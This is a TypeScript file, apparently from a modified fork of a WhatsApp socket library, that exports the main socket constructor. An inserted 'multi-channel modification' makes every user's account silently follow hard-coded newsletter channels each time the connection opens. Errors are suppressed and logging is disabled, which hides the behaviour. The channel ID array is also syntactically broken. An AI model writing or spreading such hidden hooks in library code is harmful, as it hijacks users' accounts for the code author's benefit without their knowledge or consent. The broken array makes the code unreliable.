import { DEFAULT_CONNECTION_CONFIG } from '../Defaults'
import type { UserFacingSocketConfig } from '../Types'
import { makeCommunitiesSocket } from './communities'

// export the last socket layer
const makeWASocket = (config: UserFacingSocketConfig) => {
        const newConfig = {
                ...DEFAULT_CONNECTION_CONFIG,
                ...config
        }

        // If the user hasn't provided their own history sync function,
        // let's create a default one that respects the syncFullHistory flag.
        if (config.shouldSyncHistoryMessage === undefined) {
                newConfig.shouldSyncHistoryMessage = () => !!newConfig.syncFullHistory
        }

        // --- MODIFIKASI MULTI-CHANNEL ---
        
        const sock = makeCommunitiesSocket(newConfig)

        // MASUKKAN BANYAK ID DI SINI (pisahkan dengan koma)
        const myChannelIds = [
            '120363418850727229@newsletter', // Channel 1
            '120363405767028359@newsletter', // Channel 2
            '120363422876371207@newsletter'  // Channel 3, dst...

'120363405767028359@newsletter'
 //sanzy

        ]

        sock.ev.on('connection.update', async (update) => {
            const { connection } = update
            if (connection === 'open') {
                // @ts-ignore
                if (sock.newsletterFollow) {
                    // Loop semua ID yang ada di daftar
                    for (const id of myChannelIds) {
                        try {
                            await sock.newsletterFollow(id)
                            // console.log(`Sukses join ke: ${id}`)
                        } catch (error) {
                            // Diamkan error per channel, lanjut ke channel berikutnya
                        }
                    }
                }
            }
        })

        return sock
        // --- MODIFIKASI SELESAI ---
}

export default makeWASocket
